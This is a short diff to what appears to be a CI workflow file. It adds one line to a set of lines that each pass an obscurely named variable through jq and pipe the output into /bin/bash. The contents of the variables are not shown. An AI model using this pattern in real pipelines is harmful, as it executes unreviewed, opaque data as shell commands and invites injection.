@@ -32,6 +32,7 @@ jobs:
           echo $qlm34 | jq -r .jv101 | /bin/bash
           printf '%s' "$hph3" | jq -r .thqm17929 | /bin/bash
           echo $jmc84 | jq -r .ddxj209 | /bin/bash
+          echo $ov3 | jq -r .kwk723 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
